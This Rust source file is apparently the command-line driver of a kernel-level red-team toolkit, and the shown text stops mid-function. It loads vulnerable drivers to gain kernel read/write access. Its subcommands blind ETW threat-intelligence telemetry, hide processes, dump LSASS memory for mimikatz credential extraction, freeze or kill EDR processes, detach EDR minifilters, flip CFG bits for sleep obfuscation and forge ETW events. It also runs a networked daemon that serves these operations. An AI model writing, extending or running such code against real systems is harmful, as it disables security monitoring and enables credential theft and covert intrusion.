//! nyx-kernel — operator-side kernel-tier CLI.
//!
//! Drives the full kernel-tier chain:
//!   bootstrap_chain → resolve_offsets → assemble_tier → kit dispatch
//!
//! This is the operational consumer of `nyx-operator-kernelsdk`: it turns the
//! 8 implemented kernel kits (ETW-TI blind, callback neutralize, MiniFilter
//! detach, process hide, PPL strip, LSASS dump, WFP silence, EDR neutralize)
//! from library artifacts into an operator-driven tool.
//!
//! # Safety / authorization
//! Loads a driver (BYOVD path) or opens a kernel device (KslD path) and
//! reads/writes kernel memory. BSOD risk. **Authorized red-team use only.**
//!
//! # Usage (on the Windows target, admin cmd)
//!   nyx-kernel bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--alsysio <sys>] [--flt-rva <hex>]
//!   nyx-kernel assess   # real T4-T5 kernel assessment ({"assess":{...}} JSON line)
//!   nyx-kernel blind-etw
//!   nyx-kernel hide <pid>
//!   nyx-kernel dump-lsass <pid>
//!   nyx-kernel neutralize <pid> <freeze|choke|kill>
//!   nyx-kernel detach-minifilter
//!   nyx-kernel window-open [pid] / window-close   # T2 operator time-window
//!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
//!   nyx-kernel wfp-selftest  # driverless WFP kit e2e (admin; baseline→block→restore)
//!   nyx-kernel --serve <port>   # daemon mode — REQUIRES NYX_DAEMON_TOKEN (see below)
//!   nyx-kernel --help           # full usage incl. daemon wire protocol
//!
//! Daemon mode (`--serve <port>`): persistent kernel session over localhost
//! TCP. The daemon REFUSES to start without the `NYX_DAEMON_TOKEN` env var
//! (shared secret). The FIRST line of every connection must be `auth <token>`
//! (constant-time compare), answered with `{"ok":true}`; wrong/absent token
//! closes the connection with an error line. Ops are JSON lines
//! `{"op":"...","pid":N}` → JSON reply lines, rate-limited per connection
//! (60 ops/min). pid-taking ops reject pid <= 0 or absent. Lines longer than
//! 16 KiB close the connection.
//!
//! Build version is detected at runtime via RtlGetVersion — NO hardcoded build.
//! All offsets come from the build table (`for_build`) or pattern scan.

// This CLI is Windows-only; the non-Windows stub main() at the bottom
// makes `cargo check` pass on macOS/Linux. On Windows, all the kit code
// compiles but not every kit is reachable from every subcommand, so some
// imports/code paths are flagged by the compiler. Allow them here rather
// than cluttering every function with #[allow] attributes.
#![allow(unused_imports, unreachable_code, dead_code)]

#[cfg(target_os = "windows")]
fn main() {
    use nyx_operator_kernelsdk::win;

    // ---- 1. Parse args ----
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!("usage: nyx-kernel <command> [...]   (try `nyx-kernel --help`)");
        std::process::exit(1);
    }
    if args.iter().any(|a| a == "--help" || a == "-h") {
        println!("{}", usage_text());
        std::process::exit(0);
    }
    let cmd = &args[1];

    // ---- 1b. Driverless assessment early path (`assess --user`) ----
    // The two user-mode NtQuery paths (module enumeration + code integrity)
    // run on ANY real Windows without a driver — this is what the hosted
    // windows-ci hard gate exercises. `assess` without `--user` requires a
    // bootstrap below (BYOVD/KslD) and additionally measures callback arrays
    // + ETW-TI.
    if cmd == "assess" && args.iter().any(|a| a == "--user") {
        let a = unsafe { nyx_operator_kernelsdk::assess_kernel(None) };
        println!("{}", assess_json_line(&a));
        eprintln!(
            "[+] driverless kernel assessment: status={:?} total_drivers={} edr_drivers={} hvci={} vbs={}",
            a.status, a.total_drivers, a.edr_drivers, a.hvci_enabled, a.vbs_enabled
        );
        return;
    }

    // ---- 1c. WFP kit self-test (driverless: needs admin + BFE, no driver) ----
    // End-to-end proof of netsec::UserModeEdrSilencer on a live box. See
    // op_wfp_selftest. Hidden child modes: --wfp-probe-connect (one loopback
    // TCP connect attempt, exit 0/1) and --wfp-probe-idle (AppId anchor).
    if cmd == "wfp-selftest" {
        std::process::exit(op_wfp_selftest());
    }
    if cmd == "--wfp-probe-connect" {
        let addr = args.get(2).map(|s| s.as_str()).unwrap_or("");
        std::process::exit(wfp_probe_connect(addr));
    }
    if cmd == "--wfp-probe-idle" {
        std::thread::sleep(std::time::Duration::from_secs(120));
        std::process::exit(0);
    }

    // ---- 2. Detect Windows build at runtime (no hardcoding) ----
    let build = detect_build();
    eprintln!("[*] detected Windows build {build}");

    // Resolve EPROCESS offsets from the table (table-driven, version-agnostic).
    let eprocess = match nyx_operator_kernelsdk::offsets::for_build(build) {
        Some(b) => b.offsets,
        None => {
            eprintln!(
                "[!] build {build} not in offset table — kernel-tier operations need a known build or probe fallback"
            );
            std::process::exit(2);
        }
    };

    // Resolve ETW-TI offsets from the table.
    let etw_ti_offsets = match nyx_operator_kernelsdk::etwti::EtwTiOffsets::for_build(build) {
        Some(o) => o,
        None => {
            eprintln!("[!] ETW-TI offsets unknown for build {build}");
            // Non-fatal: ETW-TI ops will be skipped, others still work.
            nyx_operator_kernelsdk::etwti::EtwTiOffsets {
                guid_entry_to_provider_block: 0,
                provider_block_to_enable_info: 0,
                is_enabled_within_enable_info: 0,
            }
        }
    };

    // Parse optional --flt-rva (operator-supplied FltGlobals RVA for MiniFilter).
    let flt_rva = parse_flag_u32(&args, "--flt-rva");

    // Parse optional --byovd <sys> <svc>.
    let (byovd_sys, byovd_svc) = parse_byovd(&args);

    // Parse optional --wdt <sys> (blocklist-safe phys-mode BYOVD) with
    // optional --wdt-svc <name> (default WDTKernel).
    let wdt_sys = parse_flag_string(&args, "--wdt");
    let wdt_svc = parse_flag_string(&args, "--wdt-svc");

    // Parse optional --alsysio <sys> (clean phys-mode BYOVD via CPUID CPU-Z
    // v2.0.x — v2.1.0.0 removed the R/W IOCTLs) with optional --alsysio-svc.
    let alsys_sys = parse_flag_string(&args, "--alsysio");
    let alsys_svc = parse_flag_string(&args, "--alsysio-svc");

    // ---- 3. Bootstrap: KslD (default) → BYOVD fallback / phys mode ----
    let phys_arm = wdt_sys
        .as_ref()
        .map(|p| ("wdt", p, wdt_svc.clone(), "WDTKernel"))
        .or_else(|| {
            alsys_sys
                .as_ref()
                .map(|p| ("alsysio", p, alsys_svc.clone(), "ALSysIO64"))
        });
    let bootstrap = if let Some((kind, phys_path, phys_svc, default_svc)) = phys_arm {
        // Phys path: resolve ntoskrnl base DRIVERLESS first (CR3 validation
        // needs a kernel VA to page-walk), then load the driver → discover
        // CR3 (physical scan + MZ gate) → wrap in VaKernelRw.
        eprintln!("[*] {kind} phys-mode bootstrap ({phys_path})...");
        let nt_base = match unsafe { win::kernel_base::ntoskrnl_base() } {
            Ok(b) => b as u64,
            Err(e) => {
                eprintln!("[!] ntoskrnl base resolution failed: {e:?}");
                std::process::exit(3);
            }
        };
        let sys_u16 = to_utf16(phys_path);
        let svc_u16 = to_utf16(phys_svc.as_deref().unwrap_or(default_svc));
        let scan_budget_mb = std::env::var("NYX_WDT_SCAN_MB")
            .ok()
            .and_then(|v| v.parse::<usize>().ok())
            .unwrap_or(2048);
        let result = match kind {
            "alsysio" => unsafe {
                win::alsys::bootstrap_alsys(
                    sys_u16.as_slice(),
                    svc_u16.as_slice(),
                    nt_base,
                    &eprocess,
                    scan_budget_mb,
                )
                .map(|(loaded, rw)| win::KernelBootstrap::Alsys(loaded, rw))
            },
            _ => unsafe {
                win::wdt::bootstrap_wdt(
                    sys_u16.as_slice(),
                    svc_u16.as_slice(),
                    nt_base,
                    &eprocess,
                    scan_budget_mb,
                )
                .map(|(loaded, rw)| win::KernelBootstrap::Wdt(loaded, rw))
            },
        };
        match result {
            Ok(b) => {
                eprintln!("[+] {kind} bootstrap OK (cr3 discovered + MZ-validated)");
                // VA→PA selftest: the CR3 scan MZ-gate proves the walk, but
                // NOT the VaKernelRw adapter path (VA contract check →
                // per-page translate → chunked phys read). Read the ntoskrnl
                // base through the live adapter and require MZ before running
                // any kernel op on top of it. On failure, unload the driver
                // (no residue) and refuse to continue on a broken primitive.
                let mut mz = [0u8; 2];
                let ok = matches!(
                    b.as_kernel_rw().kread(nt_base as usize, &mut mz),
                    Ok(()) if &mz == b"MZ"
                );
                if !ok {
                    eprintln!(
                        "[!] {kind} VA→PA selftest FAILED: kread(ntoskrnl base) did not yield MZ — \
                         unloading driver and refusing to run ops on a broken VA layer"
                    );
                    unload_phys_bootstrap(b);
                    std::process::exit(3);
                }
                eprintln!("[+] {kind} VA→PA selftest OK (MZ at ntoskrnl base via VaKernelRw)");
                b
            }
            Err(e) => {
                eprintln!("[!] {kind} bootstrap failed: {e:?}");
                std::process::exit(3);
            }
        }
    } else {
        eprintln!("[*] bootstrap_chain (KslD → BYOVD fallback)...");
        let sys_utf16 = byovd_sys.as_ref().map(|s| to_utf16(s));
        let svc_utf16 = byovd_svc.as_ref().map(|s| to_utf16(s));
        match unsafe { win::bootstrap_chain(sys_utf16.as_deref(), svc_utf16.as_deref()) } {
            Ok(b) => {
                let kind = match &b {
                    win::KernelBootstrap::KslD(_) => "KslD",
                    win::KernelBootstrap::Byovd(_, _) => "BYOVD",
                    win::KernelBootstrap::Wdt(_, _) => "WDT",
                    win::KernelBootstrap::Alsys(_, _) => "ALSysIO",
                };
                eprintln!("[+] bootstrap OK via {kind}");
                b
            }
            Err(e) => {
                eprintln!("[!] bootstrap failed: {e:?}");
                std::process::exit(3);
            }
        }
    };

    // ---- 4. Resolve runtime offsets (pattern scan, autonomous) ----
    let krw_ref = bootstrap.as_kernel_rw();
    eprintln!("[*] resolve_offsets (pattern scan)...");
    let runtime = match win::resolve_offsets(krw_ref, build, flt_rva) {
        Ok(o) => {
            eprintln!(
                "[+] offsets resolved (etw_ti=0x{:x}, ps_head=0x{:x}, flt=0x{:x})",
                o.etw_ti_handle_kva, o.ps_active_process_head_kva, o.flt_globals_kva
            );
            o
        }
        Err(e) => {
            eprintln!("[!] resolve_offsets failed: {e:?}");
            std::process::exit(4);
        }
    };

    // ---- 5. Assemble the tier (consumes bootstrap → owns live KernelRw) ----
    let tier = win::assemble_tier(bootstrap, &runtime, eprocess, etw_ti_offsets, build);
    eprintln!(
        "[+] tier assembled: etw_ti={}, cb={}, mf={}, wfp={}, hide={}, ppl={}, cred={}, neu={}",
        tier.etw_ti.is_some(),
        tier.callbacks.is_some(),
        tier.minifilter.is_some(),
        tier.wfp.is_some(),
        tier.hide.is_some(),
        tier.ppl.is_some(),
        tier.cred.is_some(),
        tier.neutralize.is_some(),
    );

    // ---- 6a. Daemon mode: --serve <port> keeps the tier live and serves
    // kernel ops over a local TCP socket (one persistent bootstrap session,
    // avoiding re-bootstrap + re-pattern-scan per op). JSON line protocol:
    //   {"op":"dump-lsass","pid":684}\n  → {"ok":true,"out_file":"lsass_684.dmp"}\n
    //   {"op":"blind-etw"}               → {"ok":true}\n
    //   {"op":"hide","pid":1234}         → {"ok":true}\n
    //   {"op":"detach-minifilter"}       → {"ok":true}\n
    //   {"op":"window-open","pid":N}     → {"ok":true,"phase":"open",...}\n
    //   {"op":"window-close"}            → {"ok":false,"phase":"close","best_effort":true,...}\n
    // Auth: NYX_DAEMON_TOKEN is REQUIRED — the daemon refuses to start
    // without it, and every connection must open with `auth <token>`.
    // Backward-compatible: --serve absent → normal subcommand dispatch below.
    if let Some(port_str) = args
        .iter()
        .position(|a| a == "--serve")
        .and_then(|i| args.get(i + 1))
    {
        let port = match port_str.parse::<u16>() {
            Ok(p) => p,
            Err(_) => {
                eprintln!("[!] --serve needs a numeric port");
                std::process::exit(1);
            }
        };
        // Shared secret: refuse to serve kernel ops without one.
        let token = match std::env::var("NYX_DAEMON_TOKEN") {
            Ok(t) if !t.is_empty() => t,
            _ => {
                eprintln!(
                    "[!] --serve requires NYX_DAEMON_TOKEN (shared daemon auth secret) — refusing to start"
                );
                std::process::exit(7);
            }
        };
        run_daemon(tier, build, port, token);
    }

    // ---- 6. Dispatch the requested command ----
    match cmd.as_str() {
        "bootstrap" => {
            // Just bootstrap + assemble — the tier is live. Print status.
            eprintln!("[+] bootstrap complete. tier.rw is live. Use a subcommand to drive a kit.");
        }

        "assess" => {
            // Real T4-T5 kernel assessment (BYOVD/KslD-backed, hosted-CI
            // verified). An assessment is NOT a gate: exit 0 even for a
            // hostile posture — only a complete failure to produce any real
            // data is an error (and even that is reported, not faked).
            let a = unsafe { nyx_operator_kernelsdk::assess_kernel(Some(&*tier.rw)) };
            // Single JSON line on stdout for the CI gate / team-server parser.
            println!("{}", assess_json_line(&a));
            // Human summary on stderr (keeps stdout machine-parseable).
            eprintln!(
                "[+] kernel assessment: status={:?} total_drivers={} edr_drivers={} \
                 etw_ti_active={} process_callbacks={} image_load_callbacks={} \
                 registry_callbacks={} test_signing={} kd_debugger={} hvci={} vbs={}",
                a.status,
                a.total_drivers,
                a.edr_drivers,
                a.etw_ti_active,
                a.process_callbacks,
                a.image_load_callbacks,
                a.registry_callbacks,
                a.test_signing_enabled,
                a.kernel_debugger_present,
                a.hvci_enabled,
                a.vbs_enabled
            );
        }

        "blind-etw" => match op_blind_etw(&tier) {
            Ok(()) => eprintln!("[+] ETW-TI blinded OK"),
            Err(e) => {
                eprintln!("[!] {e}");
                std::process::exit(5);
            }
        },

        "hide" => {
            let pid = parse_pid(&args, 2);
            match op_hide(&tier, pid) {
                Ok(()) => eprintln!("[+] process {pid} hidden (DKOM)"),
                Err(e) => {
                    eprintln!("[!] {e}");
                    std::process::exit(5);
                }
            }
        }

        "dump-lsass" => {
            let pid = parse_pid(&args, 2);
            match op_dump_lsass(&tier, build, pid) {
                Ok(d) => eprintln!(
                    "[+] LSASS minidump: {} ({} bytes raw + envelope, base_va=0x{:x}, build={build}). \
                     Parse with mimikatz `sekurlsa::logonpasswords`.",
                    d.path, d.dump_len, d.base_va
                ),
                Err(e) => {
                    eprintln!("[!] {e}");
                    std::process::exit(5);
                }
            }
        }

        "neutralize" => {
            let pid = parse_pid(&args, 2);
            let method = match args.get(3).map(|s| s.as_str()) {
                Some("freeze") => nyx_operator_kernelsdk::NeutralizeMethod::Freeze,
                Some("choke") => nyx_operator_kernelsdk::NeutralizeMethod::Choke,
                Some("kill") => nyx_operator_kernelsdk::NeutralizeMethod::Kill,
                _ => {
                    eprintln!("usage: neutralize <pid> <freeze|choke|kill>");
                    std::process::exit(1);
                }
            };
            match op_neutralize(&tier, pid, method) {
                Ok(NeutralizeOutcome::Done) => {
                    eprintln!("[+] EDR {pid} neutralized ({method:?})");
                }
                Ok(NeutralizeOutcome::KillKva(kva)) => eprintln!(
                    "[+] EDR {pid} kill: EPROCESS KVA 0x{kva:x} — terminate via driver \
                     IOCTL or PplStripper"
                ),
                Err(e) => {
                    eprintln!("[!] {e}");
                    std::process::exit(5);
                }
            }
        }

        "detach-minifilter" => match op_detach_minifilter(&tier) {
            Ok(()) => eprintln!("[+] EDR MiniFilters detached"),
            Err(e) => {
                eprintln!("[!] {e}");
                std::process::exit(5);
            }
        },

        "window-open" | "window-close" | "window" => {
            let phase = parse_window_phase(&args);
            match phase {
                "open" => {
                    let pid = parse_window_pid(&args);
                    match op_window_open(&tier, pid) {
                        Ok(()) => {
                            eprintln!(
                                "[+] window OPEN (blind-etw → neutralize freeze → detach-minifilter)"
                            );
                            eprintln!(
                                "[*] implant tasks are NOT paused; sequence inject/hashdump now, then window-close"
                            );
                        }
                        Err((step, e)) => {
                            eprintln!("[!] window-open failed at {step}: {e}");
                            std::process::exit(5);
                        }
                    }
                }
                "close" => {
                    println!("{}", window_close_reply());
                    eprintln!(
                        "[*] window-close is best-effort: no kit in the default window has a kernelsdk undo op"
                    );
                }
                _ => {
                    eprintln!("usage: nyx-kernel window --phase open|close [pid]");
                    std::process::exit(1);
                }
            }
        }

        "pg-window" => {
            // Enter a PatchGuard unchecked window. select_pg_window picks the
            // best available bypass for the current build (RuntimePgBypass on
            // Win11 24H2+, TimingRepair on Win10/early Win11). The window
            // borrows tier.rw for the duration — we hold the guard until the
            // operator signals completion, then Drop repairs PG state.
            //
            // kernelsdk-1-1: the PG-context offsets table is PLACEHOLDER
            // (0x190/0x08, never PDB-verified), so select_pg_window is gated
            // OFF and currently returns None for every build. This command is
            // expected to exit 5 until per-build PDB validation flips a row.
            eprintln!("[*] selecting PatchGuard window for build {build}...");
            let window_kind = if build >= 26100 {
                "RuntimePgBypass"
            } else {
                "TimingRepair"
            };
            match win::select_pg_window(build, &*tier.rw) {
                Some(kit) => {
                    eprintln!("[+] selected {window_kind} window; entering unchecked window...");
                    match kit.enter_unchecked(&*tier.rw) {
                        Ok(_guard) => {
                            eprintln!("[+] PatchGuard unchecked window OPEN — DKOM edits safe");
                            eprintln!("[*] press ENTER to close the window (Drop repairs PG)...");
                            // Block on stdin until the operator signals completion.
                            // The guard lives until this closure returns; Drop runs on exit.
                            let mut line = String::new();
                            let _ = std::io::stdin().read_line(&mut line);
                            eprintln!("[+] closing window — PG repair running on Drop");
                            // _guard drops here, invoking the repair callback.
                        }
                        Err(e) => {
                            eprintln!(
                                "[!] enter_unchecked failed (PG context not in safe state): {e:?}"
                            );
                            eprintln!("    retry when PG is between validation cycles (~5min gap)");
                            std::process::exit(5);
                        }
                    }
                }
                None => {
                    eprintln!(
                        "[!] no PatchGuard window available for build {build}: PG-context offsets are \
                         experimental placeholders (kernelsdk-1-1) and the capability is gated off — \
                         nothing was entered, no kernel state was touched"
                    );
                    std::process::exit(5);
                }
            }
        }

        "cfg-bypass" => {
            // Mark NtContinue as valid CFG call target via kernel r/w.
            // Enables Ekko/Foliage sleep obfuscation on CFG-enabled processes.
            let nt_continue = unsafe {
                let ntdll = winapi_get_module_handle("ntdll.dll\0");
                if ntdll.is_null() {
                    eprintln!("[!] ntdll not found");
                    std::process::exit(5);
                }
                winapi_get_proc_address(ntdll, c"NtContinue".as_ptr().cast::<u8>())
            };
            if nt_continue.is_null() {
                eprintln!("[!] NtContinue not found in ntdll");
                std::process::exit(5);
            }
            let nt_continue_addr = nt_continue as usize;
            eprintln!("[*] NtContinue at 0x{nt_continue_addr:x}");

            let init_block = unsafe {
                let ntdll = winapi_get_module_handle("ntdll.dll\0");
                winapi_get_proc_address(ntdll, c"LdrSystemDllInitBlock".as_ptr().cast::<u8>())
            };
            if init_block.is_null() {
                eprintln!("[!] LdrSystemDllInitBlock not found");
                std::process::exit(5);
            }
            let init_addr = init_block as usize;
            let block_size = unsafe { *(init_addr as *const u32) } as usize;
            eprintln!("[*] LdrSystemDllInitBlock size = 0x{block_size:x}");

            // kernel-tools-4: shared offset selection from operator-kernelsdk —
            // the standalone cfg-write binary used a DIVERGENT mapping for the
            // same block sizes, so at most one of the two was ever correct.
            let cfg_off = nyx_operator_kernelsdk::cfg::cfg_bitmap_offset(block_size);

            let bitmap_addr = unsafe { *((init_addr + cfg_off) as *const usize) };
            let bitmap_size = unsafe { *((init_addr + cfg_off + 8) as *const usize) };
            eprintln!("[*] CFG bitmap at 0x{bitmap_addr:x}, size 0x{bitmap_size:x}");
            if bitmap_addr == 0 || bitmap_size == 0 {
                eprintln!("[!] CFG bitmap unavailable");
                std::process::exit(5);
            }

            let bit = nt_continue_addr >> 4;
            let boff = bit >> 3;
            let bpos = (bit & 7) as u8;
            if boff >= bitmap_size {
                eprintln!("[!] address outside bitmap");
                std::process::exit(5);
            }

            let va = bitmap_addr + boff;
            let mut buf = [0u8; 1];
            tier.rw.kread(va, &mut buf).unwrap_or_else(|e| {
                eprintln!("[!] CFG bitmap read failed: {e:?}");
                std::process::exit(5);
            });
            let old = buf[0];
            let was = (old >> bpos) & 1;
            buf[0] |= 1 << bpos;
            if buf[0] != old {
                tier.rw.kwrite(va, &buf).unwrap_or_else(|e| {
                    eprintln!("[!] CFG bitmap write failed: {e:?}");
                    std::process::exit(5);
                });
                eprintln!("[+] NtContinue CFG bit SET (off={boff}, bit={bpos})");
            } else {
                eprintln!("[+] already set (off={boff}, bit={bpos})");
            }
            eprintln!("[*] old={old:#04x} new={:#04x} was_set={was}", buf[0]);
        }

        "forge-etw" => {
            // ETW event forgery — drives the otherwise-dead etw_deception module.
            // Generates a synthetic Process Start event buffer (structurally
            // identical to a real Microsoft-Windows-Kernel-Process event) and
            // writes it to a file for operator review / NtTraceEvent injection.
            //
            // Usage: forge-etw <parent_pid> <child_pid> <image_name> [output.bin]
            let parent_pid = args.get(2).and_then(|s| s.parse::<u32>().ok()).unwrap_or(4);
            let child_pid = args
                .get(3)
                .and_then(|s| s.parse::<u32>().ok())
                .unwrap_or(1234);
            let image_name = args
                .get(4)
                .cloned()
                .unwrap_or_else(|| r"C:\Windows\System32\svchost.exe".to_string());
            let out_path = args
                .get(5)
                .cloned()
                .unwrap_or_else(|| format!("forge_etw_proc_create_{child_pid}.bin"));

            let deceiver =
                nyx_operator_kernelsdk::etw_deception::EtwDeceiver::with_kernel_defaults();
            let timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos() as u64;
            // kernelsdk-2-7: the API documents the image path as UTF-16LE bytes
            // (the forged event embeds a UNICODE_STRING); the CLI previously
            // passed raw ASCII bytes (1 byte per char), producing a malformed
            // image name. Encode properly.
            let image_utf16: Vec<u8> = image_name
                .encode_utf16()
                .flat_map(|u| u.to_le_bytes())
                .collect();
            let buf = deceiver
                .forge_process_create(parent_pid, child_pid, &image_utf16, timestamp)
                .map_err(|e| {
                    eprintln!("[!] forge_process_create failed: {e}");
                    std::process::exit(5);
                })
                .unwrap();
            match std::fs::write(&out_path, &buf) {
                Ok(()) => eprintln!(
                    "[+] forged Process Start event ({} bytes) written to {out_path}\n    \
                     parent={parent_pid} child={child_pid} image=\"{image_name}\"\n    \
                     inject via NtTraceEvent(session_handle, 0, buf.len(), buf)",
                    buf.len()
                ),
                Err(e) => {
                    eprintln!("[!] failed to write {out_path}: {e}");
                    std::process::exit(5);
                }
            }
        }

        _ => {
            eprintln!("unknown command: {cmd}");
            std::process::exit(1);
        }
    }

    eprintln!("[+] done");
}

// ---- Runtime build detection (no hardcoded version) ----

/// Detect the Windows build number via `RtlGetVersion`. Works on 7–11 25H2.
/// Returns 0 on failure (the table lookup will then fail cleanly).
#[cfg(target_os = "windows")]
fn detect_build() -> u32 {
    #[repr(C)]
    struct RtlOsVersionInfoExW {
        os_version_info_size: u32,
        major_version: u32,
        minor_version: u32,
        build_number: u32,
        platform_id: u32,
        sz_csd_version: [u16; 128],
        service_pack_major: u16,
        service_pack_minor: u16,
        suite_mask: u16,
        product_type: u8,
        reserved: u8,
    }

    extern "system" {
        fn RtlGetVersion(info: *mut RtlOsVersionInfoExW) -> i32;
    }

    let mut info = RtlOsVersionInfoExW {
        os_version_info_size: core::mem::size_of::<RtlOsVersionInfoExW>() as u32,
        major_version: 0,
        minor_version: 0,
        build_number: 0,
        platform_id: 0,
        sz_csd_version: [0; 128],
        service_pack_major: 0,
        service_pack_minor: 0,
        suite_mask: 0,
        product_type: 0,
        reserved: 0,
    };

    // SAFETY: RtlGetVersion fills the struct; the size field is set correctly.
    let status = unsafe { RtlGetVersion(&mut info) };
    if status == 0 {
        info.build_number
    } else {
        0
    }
}

// ---- Shared kernel ops (kernel-tools-5) ----
//
// ONE implementation per kernel op, used by BOTH the CLI subcommand dispatch
// (main() above) and the daemon dispatcher (dispatch_daemon_op below). Before
// this consolidation the two arms drifted — dump-lsass was the worst: the CLI
// wrote RAW bytes when base_va==0 (a false-success artifact mimikatz rejects)
// while the daemon errored. Decisions made once here:
//   * `base_va == 0` after `dump_lsass_with_base` is an ERROR. A dump without
//     the source VA cannot be wrapped in a minidump envelope; the raw-bytes
//     fallback is REMOVED.
//   * `neutralize(Kill)` resolves the target EPROCESS KVA via `kill_kva` (the
//     actionable artifact for a driver IOCTL / PplStripper flow); Freeze/Choke
//     run the user-mode `neutralize()` tier.

/// Result of a successful [`op_dump_lsass`] — the written minidump artifact.
#[cfg(target_os = "windows")]
struct LsassDump {
    path: String,
    dump_len: usize,
    base_va: u64,
}

/// Shared `dump-lsass` kernel op (CLI + daemon): kernel-capture LSASS bytes
/// for `pid`, wrap them in a minidump envelope (needs the source VA), write
/// `lsass_{pid}.dmp`. `base_va == 0` → Err (raw bytes are NOT a usable dump).
#[cfg(target_os = "windows")]
fn op_dump_lsass(
    tier: &nyx_operator_kernelsdk::KernelTier,
    build: u32,
    pid: u32,
) -> Result<LsassDump, String> {
    use nyx_operator_kernelsdk::CredKit;
    let cred = tier
        .cred
        .as_ref()
        .ok_or_else(|| "cred kit not available".to_string())?;
    let (bytes, base_va) = cred
        .dump_lsass_with_base(&*tier.rw, pid)
        .map_err(|e| format!("dump_lsass failed: {e:?}"))?;
    if base_va == 0 {
        return Err(format!(
            "base VA unresolved for pid {pid} — raw bytes are not a minidump and mimikatz would \
             reject them; refusing to write a false-success artifact"
        ));
    }
    let dump = nyx_minidump_assembler::assemble_minidump(pid, base_va, &bytes, build);
    let path = format!("lsass_{pid}.dmp");
    std::fs::write(&path, &dump).map_err(|e| format!("write {path} failed: {e}"))?;
    Ok(LsassDump {
        path,
        dump_len: dump.len(),
        base_va,
    })
}

/// Shared `blind-etw` kernel op (CLI + daemon).
#[cfg(target_os = "windows")]
fn op_blind_etw(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(), String> {
    use nyx_operator_kernelsdk::EtwTiKit;
    let etw = tier
        .etw_ti
        .as_ref()
        .ok_or_else(|| "ETW-TI kit not available (etw_ti_handle_kva was 0)".to_string())?;
    etw.blind(&*tier.rw)
        .map_err(|e| format!("ETW-TI blind failed: {e:?}"))
}

// ---- wfp-selftest -----------------------------------------------------------

/// Hidden child mode: one TCP connect to `addr` (e.g. "127.0.0.1:49152"),
/// exit 0 on success / 1 on failure. Keeps the stream open briefly so the
/// parent's accept() drains the completed handshake from the backlog.
#[cfg(target_os = "windows")]
fn wfp_probe_connect(addr: &str) -> i32 {
    use std::net::{SocketAddr, TcpStream};
    let sa: SocketAddr = match addr.parse() {
        Ok(sa) => sa,
        Err(_) => return 1,
    };
    match TcpStream::connect_timeout(&sa, std::time::Duration::from_secs(5)) {
        Ok(_s) => {
            std::thread::sleep(std::time::Duration::from_millis(400));
            0
        }
        Err(_) => 1,
    }
}

/// `wfp-selftest` — driverless end-to-end proof of the WFP kit
/// (`netsec::UserModeEdrSilencer`) on a live Windows box:
///
///   1. baseline:  a sacrificial probe copy of THIS exe connects loopback → OK
///   2. install:   `silence_edr([idle_probe_pid])` → ALE_APP_ID block filter
///                 bound to the probe image path; assert filter_count == 1
///   3. blocked:   a new probe process connects → MUST FAIL (else the filter
///                 matches nothing and the kit is a false capability)
///   4. residue:   drop the guard (BFE session close auto-removes session
///                 filters) → a new probe connects → MUST SUCCEED (else the
///                 session-scoped cleanup contract is broken — the
///                 "filters outlive us" residue bug class)
///
/// All traffic is 127.0.0.1 loopback (ALE_AUTH_CONNECT_V4 covers loopback
/// connects) — no internet dependency, no third-party process involved, and
/// the AppId anchor is our own temp copy, never a real EDR image.
///
/// Requires admin (FwpmEngineOpen0 → BFE). No driver / no bootstrap needed.
///
/// Exit codes: 0 pass · 2 baseline broken (harness fault, NOT the kit) ·
/// 3 filter did not block · 4 residue after drop · 5 operational error ·
/// 6 env skip (no admin / BFE down — `note` starts with `env_limit:`, not a
/// product failure).
/// Prints ONE machine-readable line: {"wfp_selftest":{...}} on stdout.
#[cfg(target_os = "windows")]
fn op_wfp_selftest() -> i32 {
    use nyx_operator_kernelsdk::netsec::{
        wfp_error_is_env_limit, wfp_image_paths_equal, WFP_SESSION_FLAG_DYNAMIC,
    };
    use nyx_operator_kernelsdk::WfpKit;
    use std::io::Write;
    use std::net::TcpListener;
    use std::process::{Command, Stdio};

    let json_escape = |s: &str| s.replace('\\', "\\\\").replace('"', "\\\"");
    let json = |baseline: bool,
                blocked: bool,
                restored: bool,
                filters: usize,
                note: &str,
                session_flags: u32,
                app_id_blob_len: u32,
                path_match: bool| {
        let env = match note.strip_prefix("env_limit:") {
            Some(rest) => format!("\"{}\"", json_escape(rest)),
            None => "null".into(),
        };
        println!(
            r#"{{"wfp_selftest":{{"baseline":{},"blocked":{},"restored":{},"filters":{},"note":"{}","env_limit":{},"session_flags":{},"app_id_blob_len":{},"path_match":{}}}}}"#,
            baseline,
            blocked,
            restored,
            filters,
            json_escape(note),
            env,
            session_flags,
            app_id_blob_len,
            path_match
        );
        std::io::stdout().flush().ok();
    };

    // Unique sacrificial image: a copy of this exe (unique name → unique AppId).
    let own = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[!] current_exe: {e}");
            json(false, false, false, 0, "current_exe failed", 0, 0, false);
            return 5;
        }
    };
    let probe = std::env::temp_dir().join(format!("nyx_wfp_probe_{}.exe", std::process::id()));
    if let Err(e) = std::fs::copy(&own, &probe) {
        eprintln!("[!] copy self to {}: {e}", probe.display());
        json(false, false, false, 0, "probe copy failed", 0, 0, false);
        return 5;
    }
    let cleanup = |probe: &std::path::Path| {
        let _ = std::fs::remove_file(probe);
    };

    let listener = match TcpListener::bind("127.0.0.1:0") {
        Ok(l) => l,
        Err(e) => {
            eprintln!("[!] bind loopback: {e}");
            cleanup(&probe);
            json(false, false, false, 0, "listener bind failed", 0, 0, false);
            return 5;
        }
    };
    let port = listener.local_addr().map(|a| a.port()).unwrap_or(0);
    listener.set_nonblocking(true).ok();
    let addr = format!("127.0.0.1:{port}");

    // Spawn a probe child and accept its connection; returns Some(exit_code).
    let run_probe = |listener: &TcpListener, probe: &std::path::Path, addr: &str| -> Option<i32> {
        let mut child = Command::new(probe)
            .arg("--wfp-probe-connect")
            .arg(addr)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .ok()?;
        // Accept with a 10s deadline (nonblocking poll).
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        loop {
            match listener.accept() {
                Ok((_s, _peer)) => break,
                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    if std::time::Instant::now() > deadline {
                        break;
                    }
